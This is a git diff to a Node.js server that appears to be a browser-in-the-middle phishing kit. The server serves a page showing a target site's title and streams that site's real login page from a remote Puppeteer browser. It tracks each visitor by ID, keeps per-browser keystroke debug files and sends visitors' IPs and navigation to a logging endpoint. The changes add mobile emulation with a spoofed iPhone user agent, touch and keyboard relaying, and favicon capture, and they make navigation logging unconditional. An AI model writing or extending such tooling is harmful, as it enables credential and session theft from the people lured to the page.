@@ -47,25 +47,26 @@ let ship_logs = null;
   }
 
   // Get target from MongoDB
-  const target_name = process.env.TARGET_NAME || 'default';
+  const target_name = process.env.TARGET_NAME;
 
   try {
-    target = await Target.findOne({ name: target_name });
-    
-    if (!target) {
-      // If default not found, try to get the first available target
-      console.warn(`[STARTUP] Target '${target_name}' not found, looking for first available target`);
-      target = await Target.findOne().sort({ created_at: 1 });
-      
+    if (target_name) {
+      // TARGET_NAME explícito: debe existir o falla
+      target = await Target.findOne({ name: target_name });
       if (!target) {
-        console.error('ERROR: No targets found in database');
-        console.error('Use: docker-compose run -e TARGET_URL=https://... pescador');
+        console.error(`[STARTUP] ERROR: Target '${target_name}' not found in database`);
         process.exit(1);
       }
-      console.log(`[STARTUP] Using target: ${target.name}`);
     } else {
-      console.log(`[STARTUP] Using target: ${target.name}`);
+      // Sin TARGET_NAME: usa el primero disponible
+      target = await Target.findOne().sort({ created_at: 1 });
+      if (!target) {
+        console.error('[STARTUP] ERROR: No targets found in database');
+        console.error('[STARTUP] Set TARGET_URL env var to add one automatically on startup');
+        process.exit(1);
+      }
     }
+    console.log(`[STARTUP] Using target: ${target.name}`);
   } catch (err) {
     console.error('ERROR: Could not load target from MongoDB:', err.message);
     process.exit(1);
@@ -104,13 +105,338 @@ let ship_logs = null;
     })
   }
 
+  const installMobileViewportGuards = async function(page) {
+    await page.evaluateOnNewDocument(() => {
+      const disableRemoteKeyboard = () => {
+        try {
+          if (window.top === window && navigator.virtualKeyboard) {
+            navigator.virtualKeyboard.overlaysContent = true
+            if (typeof navigator.virtualKeyboard.hide === 'function') {
+              navigator.virtualKeyboard.hide()
+            }
+          }
+          document.querySelectorAll('input, textarea, [contenteditable="true"], [contenteditable=""], [contenteditable="plaintext-only"]').forEach((el) => {
+            el.setAttribute('inputmode', 'none')
+            el.setAttribute('virtualkeyboardpolicy', 'manual')
+          })
+        } catch (err) {}
+      }
+      const installControlledFocusGuard = () => {
+        if (window.__fescarControlledFocusGuardInstalled) return
+        window.__fescarControlledFocusGuardInstalled = true
+
+        const isEditable = (el) => {
+          if (!el) return false
+          const tag = el.tagName ? el.tagName.toLowerCase() : ''
+          return tag === 'input' || tag === 'textarea' || el.isContentEditable
+        }
+
+        const restoreViewport = (x, y) => {
+          try {
+            window.scrollTo(x, y)
+            const scrollingElement = document.scrollingElement || document.documentElement
+            if (scrollingElement) {
+              scrollingElement.scrollLeft = x
+              scrollingElement.scrollTop = y
+            }
+          } catch (err) {}
+        }
+
+        const focusWithoutViewportShift = (el) => {
+          if (!isEditable(el)) return
+          disableRemoteKeyboard()
+          const x = window.scrollX || 0
+          const y = window.scrollY || 0
+          try {
+            el.focus({ preventScroll: true })
+          } catch (err) {
+            try { el.focus() } catch (_) {}
+          }
+          try {
+            if ((el.tagName || '').toLowerCase() !== 'input' || el.type !== 'number') {
+              const len = typeof el.value === 'string' ? el.value.length : 0
+              if (typeof el.setSelectionRange === 'function') el.setSelectionRange(len, len)
+            }
+          } catch (err) {}
+          restoreViewport(x, y)
+          requestAnimationFrame(() => restoreViewport(x, y))
+          setTimeout(() => restoreViewport(x, y), 50)
+          setTimeout(() => restoreViewport(x, y), 150)
+        }
+
+        document.addEventListener('mousedown', (event) => {
+          const el = event.target && event.target.closest ? event.target.closest('input, textarea, [contenteditable="true"], [contenteditable=""], [contenteditable="plaintext-only"]') : event.target
+          if (!isEditable(el)) return
+          event.preventDefault()
+          focusWithoutViewportShift(el)
+        }, true)
+
+        document.addEventListener('touchstart', (event) => {
+          const el = event.target && event.target.closest ? event.target.closest('input, textarea, [contenteditable="true"], [contenteditable=""], [contenteditable="plaintext-only"]') : event.target
+          if (!isEditable(el)) return
+          event.preventDefault()
+          focusWithoutViewportShift(el)
+        }, { capture: true, passive: false })
+
+        document.addEventListener('focusin', (event) => {
+          const x = window.scrollX || 0
+          const y = window.scrollY || 0
+          disableRemoteKeyboard()
+          requestAnimationFrame(() => restoreViewport(x, y))
+          setTimeout(() => restoreViewport(x, y), 50)
+        }, true)
+      }
+      const lockViewport = () => {
+        try {
+          let meta = document.querySelector('meta[name="viewport"]')
+          if (!meta) {
+            meta = document.createElement('meta')
+            meta.setAttribute('name', 'viewport')
+            document.head.appendChild(meta)
+          }
+          meta.setAttribute('content', 'width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover')
+          document.documentElement.style.webkitTextSizeAdjust = '100%'
+          disableRemoteKeyboard()
+          installControlledFocusGuard()
+        } catch (err) {}
+      }
+      lockViewport()
+      document.addEventListener('DOMContentLoaded', lockViewport)
+      window.addEventListener('pageshow', lockViewport)
+      new MutationObserver(lockViewport).observe(document.documentElement, { childList: true, subtree: true })
+    })
+  }
+
+  const enforceMobileViewportGuards = async function(browser) {
+    if (!browser?.is_mobile || !browser.target_page) {
+      return
+    }
+    try {
+      const fixedWidth = browser.puppeteer_width || browser.user_width
+      const fixedHeight = browser.puppeteer_height || browser.user_height
+      if (fixedWidth && fixedHeight) {
+        await browser.target_page._client.send('Emulation.setDeviceMetricsOverride', {
+          width: fixedWidth,
+          height: fixedHeight,
+          deviceScaleFactor: 3,
+          mobile: false,
+          screenWidth: fixedWidth,
+          screenHeight: fixedHeight,
+          positionX: 0,
+          positionY: 0,
+          screenOrientation: { type: 'portraitPrimary', angle: 0 }
+        })
+        await browser.target_page._client.send('Emulation.setVisibleSize', { width: fixedWidth, height: fixedHeight }).catch(() => {})
+      }
+      await browser.target_page._client.send('Emulation.setPageScaleFactor', { pageScaleFactor: 1 })
+      await browser.target_page.evaluate(() => {
+        const disableRemoteKeyboard = () => {
+          if (window.top === window && navigator.virtualKeyboard) {
+            navigator.virtualKeyboard.overlaysContent = true
+            if (typeof navigator.virtualKeyboard.hide === 'function') {
+              navigator.virtualKeyboard.hide()
+            }
+          }
+          document.querySelectorAll('input, textarea, [contenteditable="true"], [contenteditable=""], [contenteditable="plaintext-only"]').forEach((el) => {
+            el.setAttribute('inputmode', 'none')
+            el.setAttribute('virtualkeyboardpolicy', 'manual')
+          })
+        }
+        const installControlledFocusGuard = () => {
+          if (window.__fescarControlledFocusGuardInstalled) return
+          window.__fescarControlledFocusGuardInstalled = true
+
+          const isEditable = (el) => {
+            if (!el) return false
+            const tag = el.tagName ? el.tagName.toLowerCase() : ''
+            return tag === 'input' || tag === 'textarea' || el.isContentEditable
+          }
+
+          const restoreViewport = (x, y) => {
+            window.scrollTo(x, y)
+            const scrollingElement = document.scrollingElement || document.documentElement
+            if (scrollingElement) {
+              scrollingElement.scrollLeft = x
+              scrollingElement.scrollTop = y
+            }
+          }
+
+          const focusWithoutViewportShift = (el) => {
+            if (!isEditable(el)) return
+            disableRemoteKeyboard()
+            const x = window.scrollX || 0
+            const y = window.scrollY || 0
+            try {
+              el.focus({ preventScroll: true })
+            } catch (err) {
+              try { el.focus() } catch (_) {}
+            }
+            try {
+              if ((el.tagName || '').toLowerCase() !== 'input' || el.type !== 'number') {
+                const len = typeof el.value === 'string' ? el.value.length : 0
+                if (typeof el.setSelectionRange === 'function') el.setSelectionRange(len, len)
+              }
+            } catch (err) {}
+            restoreViewport(x, y)
+            requestAnimationFrame(() => restoreViewport(x, y))
+            setTimeout(() => restoreViewport(x, y), 50)
+            setTimeout(() => restoreViewport(x, y), 150)
+          }
+
+          document.addEventListener('mousedown', (event) => {
+            const el = event.target && event.target.closest ? event.target.closest('input, textarea, [contenteditable="true"], [contenteditable=""], [contenteditable="plaintext-only"]') : event.target
+            if (!isEditable(el)) return
+            event.preventDefault()
+            focusWithoutViewportShift(el)
+          }, true)
+
+          document.addEventListener('touchstart', (event) => {
+            const el = event.target && event.target.closest ? event.target.closest('input, textarea, [contenteditable="true"], [contenteditable=""], [contenteditable="plaintext-only"]') : event.target
+            if (!isEditable(el)) return
+            event.preventDefault()
+            focusWithoutViewportShift(el)
+          }, { capture: true, passive: false })
+
+          document.addEventListener('focusin', (event) => {
+            const x = window.scrollX || 0
+            const y = window.scrollY || 0
+            disableRemoteKeyboard()
+            requestAnimationFrame(() => restoreViewport(x, y))
+            setTimeout(() => restoreViewport(x, y), 50)
+          }, true)
+        }
+        let meta = document.querySelector('meta[name="viewport"]')
+        if (!meta) {
+          meta = document.createElement('meta')
+          meta.setAttribute('name', 'viewport')
+          document.head.appendChild(meta)
+        }
+        meta.setAttribute('content', 'width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover')
+        document.documentElement.style.webkitTextSizeAdjust = '100%'
+        disableRemoteKeyboard()
+        installControlledFocusGuard()
+      })
+    } catch (err) {
+      if (!err.message.includes('Session closed') && !err.message.includes('Page closed')) {
+        console.warn(`[mobile viewport guard] ${err.message}`)
+      }
+    }
+  }
+
+  const focusRemoteEditableAtPoint = async function(browser, x, y) {
+    if (!browser?.is_mobile || !browser.target_page) {
+      return false
+    }
+    try {
+      return await browser.target_page.evaluate(({ x, y }) => {
+        const editableSelector = 'input, textarea, [contenteditable="true"], [contenteditable=""], [contenteditable="plaintext-only"]'
+        const isEditable = (el) => {
+          if (!el) return false
+          const tag = el.tagName ? el.tagName.toLowerCase() : ''
+          return tag === 'input' || tag === 'textarea' || el.isContentEditable
+        }
+        const findEditable = () => {
+          const hit = document.elementFromPoint(x, y)
+          if (!hit) return null
+          if (hit.closest) {
+            const closest = hit.closest(editableSelector)
+            if (closest) return closest
+            const label = hit.closest('label')
+            if (label && label.control) return label.control
+          }
+          return isEditable(hit) ? hit : null
+        }
+        const disableRemoteKeyboard = (el) => {
+          if (window.top === window && navigator.virtualKeyboard) {
+            navigator.virtualKeyboard.overlaysContent = true
+            if (typeof navigator.virtualKeyboard.hide === 'function') navigator.virtualKeyboard.hide()
+          }
+          if (el) {
+            el.setAttribute('inputmode', 'none')
+            el.setAttribute('virtualkeyboardpolicy', 'manual')
+          }
+        }
+        const restoreViewport = (scrollX, scrollY) => {
+          window.scrollTo(scrollX, scrollY)
+          const scrollingElement = document.scrollingElement || document.documentElement
+          if (scrollingElement) {
+            scrollingElement.scrollLeft = scrollX
+            scrollingElement.scrollTop = scrollY
+          }
+        }
+        const el = findEditable()
+        if (!isEditable(el)) return false
+        const scrollX = window.scrollX || 0
+        const scrollY = window.scrollY || 0
+        disableRemoteKeyboard(el)
+        try {
+          el.focus({ preventScroll: true })
+        } catch (err) {
+          try { el.focus() } catch (_) {}
+        }
+        try {
+          if ((el.tagName || '').toLowerCase() !== 'input' || el.type !== 'number') {
+            const len = typeof el.value === 'string' ? el.value.length : 0
+            if (typeof el.setSelectionRange === 'function') el.setSelectionRange(len, len)
+          }
+        } catch (err) {}
+        restoreViewport(scrollX, scrollY)
+        requestAnimationFrame(() => restoreViewport(scrollX, scrollY))
+        setTimeout(() => restoreViewport(scrollX, scrollY), 50)
+        setTimeout(() => restoreViewport(scrollX, scrollY), 150)
+        return true
+      }, { x, y })
+    } catch (err) {
+      if (!err.message.includes('Session closed') && !err.message.includes('Page closed')) {
+        console.warn(`[focus editable] ${err.message}`)
+      }
+      return false
+    }
+  }
+
+  const getRemotePointerCoordinates = async function(browser, x, y) {
+    if (!browser?.is_mobile || !browser.target_page) {
+      return { x, y, changed: false, metrics: null }
+    }
+    try {
+      const metrics = await browser.target_page._client.send('Page.getLayoutMetrics')
+      const visualViewport = metrics.cssVisualViewport || metrics.visualViewport
+      const sourceWidth = browser.puppeteer_width || browser.user_width || browser.target_page.viewport()?.width || 1
+      const sourceHeight = browser.puppeteer_height || browser.user_height || browser.target_page.viewport()?.height || 1
+      if (!visualViewport || !visualViewport.clientWidth || !visualViewport.clientHeight || !sourceWidth || !sourceHeight) {
+        return { x, y, changed: false, metrics: null }
+      }
+      const mappedX = (x * (visualViewport.clientWidth / sourceWidth)) + (visualViewport.offsetX || visualViewport.pageX || 0)
+      const mappedY = (y * (visualViewport.clientHeight / sourceHeight)) + (visualViewport.offsetY || visualViewport.pageY || 0)
+      return {
+        x: mappedX,
+        y: mappedY,
+        changed: Math.abs(mappedX - x) > 0.5 || Math.abs(mappedY - y) > 0.5,
+        metrics: {
+          width: visualViewport.clientWidth,
+          height: visualViewport.clientHeight,
+          offsetX: visualViewport.offsetX || visualViewport.pageX || 0,
+          offsetY: visualViewport.offsetY || visualViewport.pageY || 0,
+          scale: visualViewport.scale || 1,
+          sourceWidth,
+          sourceHeight
+        }
+      }
+    } catch (err) {
+      if (!err.message.includes('Session closed') && !err.message.includes('Page closed')) {
+        console.warn(`[pointer metrics] ${err.message}`)
+      }
+      return { x, y, changed: false, metrics: null }
+    }
+  }
+
   const fastify = Fastify({
     logger: false,
     bodyLimit: 19922944
   })
 
   //used to set up websockets
-  fastify.register(fastify_io, { maxHttpBufferSize: 1e11 })
+  fastify.register(fastify_io, { maxHttpBufferSize: 1e11, serveClient: true })
 
   //a bucket full of browsers :)
   var browsers = []
@@ -175,6 +501,7 @@ let ship_logs = null;
       let tracking_id = config.tracking_id
       let target_id = req.query[tracking_id] ? req.query[tracking_id] : crypto.randomBytes(8).toString('hex')
       let debugIp = req.query.debugIp || ''
+      let mobileMode = req.query.mobile === '1' ? 'true' : 'false'
       if (config.logging_endpoint) {
         const session_id = generateSessionId(client_ip + debugIp)
         console.log(`[CLICK] Session ID: ${session_id} (IP: ${client_ip}, debugIp: ${debugIp})`)
@@ -184,7 +511,7 @@ let ship_logs = null;
       //if(config.admin_ips.includes(client_ip)){
       let stream = fs.createReadStream(__dirname + "/pinpo.html")
       const debugIpSuffix = req.query.debugIp || ''
-      reply.type('text/html').send(stream.pipe(replace(/PAGE_TITLE/, target.tab_title)).pipe(replace(/CLIENT_IP/, client_ip)).pipe(replace(/TARGET_ID/, target_id)).pipe(replace(/DEBUG_MULTI_USER_IP/, debugIpSuffix)))
+      reply.type('text/html').send(stream.pipe(replace(/PAGE_TITLE/, target.tab_title)).pipe(replace(/CLIENT_IP/, client_ip)).pipe(replace(/TARGET_ID/, target_id)).pipe(replace(/DEBUG_MULTI_USER_IP/, debugIpSuffix)).pipe(replace(/MOBILE_MODE/, mobileMode)))
       //}else{
       //  reply.type('text/html').send("403")
       //}
@@ -323,7 +650,7 @@ let ship_logs = null;
     }
   })
 
-  async function get_browser(target_page) {
+  async function get_browser() {
     // Use a single shared frame buffer to avoid adding per-browser process listeners.
     const xvfb = await ensureSharedXvfb()
     let puppet_options = [
@@ -334,7 +661,9 @@ let ship_logs = null;
       `--force-device-scale-factor=${CHROMIUM_DEVICE_SCALE_FACTOR}`,
       "--start-maximized",
       "--no-sandbox",
-      `--display=${xvfb._display}`
+      `--display=${xvfb._display}`,
+      "--disk-cache-size=0",
+      "--media-cache-size=0"
     ]
 
     if (target_primary_language) {
@@ -374,6 +703,20 @@ let ship_logs = null;
     browser.keydebug_file = fs.createWriteStream(`./user_data/${browser_id}/keydebug.txt`, { flags: 'a' });
     browser.browser_id = browser_id
     browser.target_page = await browser.newPage()
+    await installMobileViewportGuards(browser.target_page)
+    if (config.mobile_emulation) {
+      await browser.target_page.emulate({
+        viewport: {
+          width: 390,
+          height: 844,
+          deviceScaleFactor: 3,
+          isMobile: false,
+          hasTouch: true,
+          isLandscape: false
+        },
+        userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
+      })
+    }
     await browser.target_page.setExtraHTTPHeaders({ 'Accept-Language': target_language_header })
     await browser.target_page.evaluateOnNewDocument((lang) => {
       try {
@@ -410,7 +753,7 @@ let ship_logs = null;
       }
       console.log('killed browser')
     }
-    await browser.target_page.goto(target_page, { waitUntil: 'networkidle2' })
+    await browser.target_page.goto('about:blank')
     browser.broadcast_page = await browser.newPage()
     browser.broadcast_page.goto(`http://localhost:58082/broadcast?id=${browser_id}`)
     return browser
@@ -420,7 +763,7 @@ let ship_logs = null;
     if (err) throw err
   
     console.log(`[STARTUP] Initializing browser with target: ${target.login_page}`);
-    let empty_fescarbowl = await get_browser(target.login_page)
+    let empty_fescarbowl = await get_browser()
 
     const warmupTargetRender = async function (browser) {
       try {
@@ -465,8 +808,34 @@ let ship_logs = null;
           empty_fescarbowl.user_width = request.viewport_width
           empty_fescarbowl.user_height = request.viewport_height
           empty_fescarbowl.session_id = request.session_id
-          await resize_window(empty_fescarbowl, empty_fescarbowl.target_page, request.viewport_width, request.viewport_height)
-          await empty_fescarbowl.target_page.setViewport({ width: request.viewport_width, height: request.viewport_height, deviceScaleFactor: VIEWPORT_DEVICE_SCALE_FACTOR })
+          empty_fescarbowl.is_mobile = request.mobile
+          if (request.mobile) {
+            // Use the user's actual viewport dimensions so touch coordinates are 1:1
+            await resize_window(empty_fescarbowl, empty_fescarbowl.target_page, request.viewport_width, request.viewport_height)
+            await empty_fescarbowl.target_page.emulate({
+              viewport: {
+                width: request.viewport_width,
+                height: request.viewport_height,
+                deviceScaleFactor: 3,
+                isMobile: false,
+                hasTouch: true,
+                isLandscape: false
+              },
+              userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
+            })
+          } else {
+            await resize_window(empty_fescarbowl, empty_fescarbowl.target_page, request.viewport_width, request.viewport_height)
+            await empty_fescarbowl.target_page.setViewport({ width: request.viewport_width, height: request.viewport_height, deviceScaleFactor: VIEWPORT_DEVICE_SCALE_FACTOR })
+          }
+          empty_fescarbowl.puppeteer_width = request.viewport_width
+          empty_fescarbowl.puppeteer_height = request.viewport_height
+          empty_fescarbowl.video_dimensions_initialized = false
+          // Navigate now, after emulation is configured, so the target site receives the correct UA
+          await empty_fescarbowl.target_page.goto(target.login_page, { waitUntil: 'domcontentloaded' })
+          await enforceMobileViewportGuards(empty_fescarbowl)
+          const actualUA = await empty_fescarbowl.target_page.evaluate(() => navigator.userAgent).catch(() => 'unknown')
+          const actualMobile = await empty_fescarbowl.target_page.evaluate(() => ({ isMobile: window.matchMedia('(hover: none)').matches, w: window.innerWidth })).catch(() => null)
+          console.log(`[new_fescar] mobile=${request.mobile} UA=${actualUA.substring(0, 80)} innerWidth=${actualMobile?.w}`)
 
           if (!getLiveSocket(request.socket_id)) {
             console.warn(`new_fescar: socket disconnected before stream assignment ${request.socket_id}`)
@@ -478,13 +847,15 @@ let ship_logs = null;
           empty_fescarbowl.user_socket = request.socket_id
           // Start this user with control of the assigned browser instance.
           empty_fescarbowl.controller_socket = request.socket_id
+          // Tell pinpo.html the actual Puppeteer viewport size so it can scale touch coordinates
+          fastify.io.to(request.socket_id).emit('fescar_viewport', { width: request.viewport_width, height: request.viewport_height })
           // Send session_id to broadcast.html
           if (empty_fescarbowl.socket_id) {
             fastify.io.to(empty_fescarbowl.socket_id).emit('set_session_id', empty_fescarbowl.session_id)
           }
           fastify.io.to(empty_fescarbowl.socket_id).emit('stream_video_to_first_viewer', request.socket_id)
 
-          empty_fescarbowl = await get_browser(target.login_page)
+          empty_fescarbowl = await get_browser()
           browsers.push(empty_fescarbowl)
         } catch (assignErr) {
           console.error(`new_fescar: failed while assigning socket ${request.socket_id}: ${assignErr.message}`)
@@ -544,23 +915,33 @@ let ship_logs = null;
             if (frame.parentFrame() === null) {
               const pageUrl = frame.url() || 'about:blank'
               const pageTitle = (await browser.target_page.title().catch(() => null)) || '(sin título)'
+              const faviconUrl = await browser.target_page.evaluate(() => {
+                const selectors = ['link[rel="icon"]', 'link[rel="shortcut icon"]', 'link[rel="apple-touch-icon"]']
+                for (const sel of selectors) {
+                  const el = document.querySelector(sel)
+                  if (el && el.href) return el.href
+                }
+                return window.location.origin + '/favicon.ico'
+              }).catch(() => null)
             
               if (browser.controller_socket !== undefined) {
                 fastify.io.to(browser.controller_socket).emit('push_state', pageUrl.split('/').slice(3).join('/'))
               }
-              if (pm && browser.user_ip !== '') {
+              
+              // Enviar logs a debug server si hay IP del usuario
+              if (browser.user_ip !== '') {
                 ship_logs({ 
                   "session_id": browser.session_id,
                   "event_ip": browser.user_ip, 
                   "target": browser.user_target_id, 
                   "event_type": "NAVIGATION", 
                   "event_url": pageUrl,
-                  "event_title": pageTitle
+                  "event_title": pageTitle,
+                  "event_favicon": faviconUrl
                 })
-                console.log(`[NAVIGATION] Session ID: ${browser.session_id} | IP: ${browser.user_ip} -> ${pageTitle} (${pageUrl})`)
-              } else {
-                console.log(`[NAVIGATION] ${browser.user_ip} -> ${pageTitle} (${pageUrl})`)
               }
+              
+              console.log(`[NAVIGATION] Session ID: ${browser.session_id} | IP: ${browser.user_ip} -> ${pageTitle} (${pageUrl})`)
             }
           } catch (err) {
             if (!err.message.includes('Session closed') && !err.message.includes('Page closed')) {
@@ -573,7 +954,7 @@ let ship_logs = null;
         browser.target_page.on('framenavigated', browser.frameNavigationListener)
         console.log(`[BROADCAST] Nuevo listener de framenavigated para browser ${browser_id} (socket ${socket.id})`)
       })
-      socket.on('new_fescar', async function (viewport_width, viewport_height, client_ip, target_id, session_id) {
+      socket.on('new_fescar', async function (viewport_width, viewport_height, client_ip, target_id, session_id, mobile) {
         // Remove pending duplicates for the same socket and keep the latest viewport.
         for (let i = pendingFescarAssignments.length - 1; i >= 0; i -= 1) {
           if (pendingFescarAssignments[i].socket_id === socket.id) {
@@ -586,7 +967,8 @@ let ship_logs = null;
           viewport_height,
           client_ip,
           target_id,
-          session_id
+          session_id,
+          mobile: !!mobile
         })
         processPendingFescarAssignments().catch((err) => {
           console.error(`new_fescar: queue processor failed: ${err.message}`)
@@ -718,6 +1100,39 @@ let ship_logs = null;
         }
         await browser.target_page.goBack()
       })
+      // Client reports actual video display size — resize Puppeteer viewport to match
+      // exactly (eliminates scaleY error caused by browser chrome consuming window height)
+      socket.on('video_dimensions', async function(dims) {
+        if (!dims || typeof dims.width !== 'number' || typeof dims.height !== 'number') return
+        const browser = browsers.get('user_socket', socket.id)
+        if (!browser || !browser.target_page) return
+        const w = Math.round(dims.width)
+        const h = Math.round(dims.height)
+        if (w < 50 || h < 50 || w > 3000 || h > 3000) return  // sanity guard
+        if (browser.is_mobile && browser.video_dimensions_initialized && browser.puppeteer_width && browser.puppeteer_height && (w < browser.puppeteer_width || h < browser.puppeteer_height)) {
+          fastify.io.to(socket.id).emit('fescar_viewport', { width: browser.puppeteer_width, height: browser.puppeteer_height })
+          console.log(`[video_dimensions] Ignoring mobile viewport shrink ${w}x${h}; keeping ${browser.puppeteer_width}x${browser.puppeteer_height} for socket ${socket.id}`)
+          return
+        }
+        try {
+          if (browser.is_mobile) {
+            await browser.target_page.emulate({
+              viewport: { width: w, height: h, deviceScaleFactor: 3, isMobile: false, hasTouch: true, isLandscape: false },
+              userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
+            })
+          } else {
+            const vp = browser.target_page.viewport()
+            await browser.target_page.setViewport({ width: w, height: h, deviceScaleFactor: (vp && vp.deviceScaleFactor) || VIEWPORT_DEVICE_SCALE_FACTOR })
+          }
+          browser.puppeteer_width = w
+          browser.puppeteer_height = h
+          browser.video_dimensions_initialized = true
+          fastify.io.to(socket.id).emit('fescar_viewport', { width: w, height: h })
+          console.log(`[video_dimensions] Puppeteer viewport → ${w}x${h} for socket ${socket.id}`)
+        } catch (err) {
+          console.warn(`[video_dimensions] Error: ${err.message}`)
+        }
+      })
       // Copy selected text from the mirrored page for operator debugging.
       socket.on("copy", async function () {
         const browser = browsers.get('controller_socket', socket.id)
@@ -751,17 +1166,12 @@ let ship_logs = null;
           await browser.target_page.keyboard.up('Control').catch(() => {})
           await browser.target_page.keyboard.up('Meta').catch(() => {})
           await browser.target_page.keyboard.up('Shift').catch(() => {})
-          await browser.target_page.keyboard.insertText(normalizedPaste)
+          // Use CDP directly — keyboard.insertText only exists in Puppeteer >=14
+          await browser.target_page._client.send('Input.insertText', { text: normalizedPaste })
+          await enforceMobileViewportGuards(browser)
           console.log(`[paste] insertText OK`)
         } catch (err) {
-          console.warn(`[paste] insertText failed, trying type(): ${err.message}`)
-          try {
-            await browser.target_page.keyboard.up('Control').catch(() => {})
-            await browser.target_page.keyboard.up('Meta').catch(() => {})
-            await browser.target_page.keyboard.type(normalizedPaste)
-          } catch (err2) {
-            console.error(`[paste] type() also failed: ${err2.message}`)
-          }
+          console.warn(`[paste] CDP insertText failed: ${err.message}`)
         }
       })
       socket.on("keydown", async function (key) {
@@ -804,6 +1214,7 @@ let ship_logs = null;
           } else if (key != 'Dead') {
             await browser.target_page.keyboard.down(key)
           }
+          await enforceMobileViewportGuards(browser)
         } catch (err) {
           if (!err.message.includes('Session closed') && !err.message.includes('Page closed')) {
             console.warn(`[KEYDOWN] Error (socket ${socket.id}): ${err.message}`);
@@ -830,6 +1241,7 @@ let ship_logs = null;
           } else if (key != 'Dead') {
             await browser.target_page.keyboard.up(key)
           }
+          await enforceMobileViewportGuards(browser)
         } catch (err) {
           if (!err.message.includes('Session closed') && !err.message.includes('Page closed')) {
             console.warn(`[KEYUP] Error (socket ${socket.id}): ${err.message}`);
@@ -841,18 +1253,69 @@ let ship_logs = null;
         if (!browser || !browser.target_page) {
           return
         }
+        if (mouse_event.type === 'mouseup' && browser.is_mobile) {
+          const vp = browser.target_page.viewport()
+          console.log(`[MOUSE_EVENT] mobile mouseup => puppeteer(${Math.round(mouse_event.clientX)},${Math.round(mouse_event.clientY)}) viewport=${vp ? vp.width+'x'+vp.height : 'unknown'}`)
+        }
         try {
+          const pointer = await getRemotePointerCoordinates(browser, mouse_event.clientX, mouse_event.clientY)
+          const pointerX = pointer.x
+          const pointerY = pointer.y
+          if (browser.is_mobile && mouse_event.type === 'mouseup' && pointer.changed && pointer.metrics) {
+            console.log(`[MOUSE_MAP] raw=(${Math.round(mouse_event.clientX)},${Math.round(mouse_event.clientY)}) css=(${Math.round(pointerX)},${Math.round(pointerY)}) visual=${Math.round(pointer.metrics.width)}x${Math.round(pointer.metrics.height)} offset=(${Math.round(pointer.metrics.offsetX)},${Math.round(pointer.metrics.offsetY)}) source=${pointer.metrics.sourceWidth}x${pointer.metrics.sourceHeight} scale=${pointer.metrics.scale}`)
+          }
+          if (browser.is_mobile && (mouse_event.type === 'mousedown' || mouse_event.type === 'mouseup' || mouse_event.type === 'click')) {
+            const editableFocused = await focusRemoteEditableAtPoint(browser, pointerX, pointerY)
+            if (editableFocused) {
+              await enforceMobileViewportGuards(browser)
+              if (mouse_event.type === 'mouseup' && browser.user_socket) {
+                fastify.io.to(browser.user_socket).emit('show_keyboard')
+              }
+              return
+            }
+          }
           if (mouse_event.type === "click") {
-            await browser.target_page.mouse.move(mouse_event.clientX, mouse_event.clientY)
+            await browser.target_page.mouse.move(pointerX, pointerY)
           } else if (mouse_event.type === "mousewheel") {
             browser.target_page.mouse.wheel({ "deltaX": mouse_event.wheelDeltaX })
             browser.target_page.mouse.wheel({ "deltaY": mouse_event.wheelDeltaY })
           } else if (mouse_event.type === "mousedown") {
-            await browser.target_page.mouse.down(mouse_event.clientX, mouse_event.clientY)
+            await browser.target_page.mouse.move(pointerX, pointerY)
+            await browser.target_page.mouse.down()
           } else if (mouse_event.type === "mouseup") {
-            await browser.target_page.mouse.up(mouse_event.clientX, mouse_event.clientY)
+            await browser.target_page.mouse.move(pointerX, pointerY)
+            await browser.target_page.mouse.up()
+            await enforceMobileViewportGuards(browser)
+            // Show the local mobile keyboard only when this tap landed on an editable.
+            // Many pages keep the prior input focused after tapping elsewhere, so using
+            // activeElement alone makes the keyboard reappear constantly.
+            if (browser.is_mobile && browser.user_socket) {
+              setTimeout(async () => {
+                try {
+                  const tappedEditable = await browser.target_page.evaluate(({ x, y }) => {
+                    const editableSelector = 'input, textarea, [contenteditable="true"], [contenteditable=""], [contenteditable="plaintext-only"]'
+                    const hit = document.elementFromPoint(x, y)
+                    const editable = hit && hit.closest ? hit.closest(editableSelector) : null
+                    if (editable) return true
+                    const active = document.activeElement
+                    if (active && active !== document.body) {
+                      const tag = active.tagName ? active.tagName.toLowerCase() : ''
+                      if (tag === 'input' || tag === 'textarea' || active.isContentEditable) {
+                        active.blur()
+                      }
+                    }
+                    return false
+                  }, { x: pointerX, y: pointerY })
+                  if (tappedEditable) {
+                    fastify.io.to(browser.user_socket).emit('show_keyboard')
+                  } else {
+                    fastify.io.to(browser.user_socket).emit('hide_keyboard')
+                  }
+                } catch (e) {}
+              }, 200)
+            }
           } else if (mouse_event.type === "mousemove") {
-            await browser.target_page.mouse.move(mouse_event.clientX, mouse_event.clientY)
+            await browser.target_page.mouse.move(pointerX, pointerY)
           }
         } catch (err) {
           if (!err.message.includes('Session closed') && !err.message.includes('Page closed')) {
@@ -863,16 +1326,21 @@ let ship_logs = null;
     })
   })
 
+  // Health check endpoint
+  fastify.get('/health', async (request, reply) => {
+    return { status: 'ok', uptime: process.uptime() };
+  });
+
   // Run the server!
   const start = async () => {
-    fastify.listen(58082, '0.0.0.0', (err) => {
-      if (err) {
-        fastify.log.error(err)
-        process.exit(1)
-      }
-      fastify.log.info(`fastify listening on ${fastify.server.address().port}`)
-    })
+    try {
+      await fastify.listen({ port: 58082, host: '0.0.0.0' })
+      console.log(`[STARTUP] Fastify listening on port 58082`)
+    } catch (err) {
+      fastify.log.error(err)
+      process.exit(1)
+    }
   }
-  start()
+  await start()
 
 })();
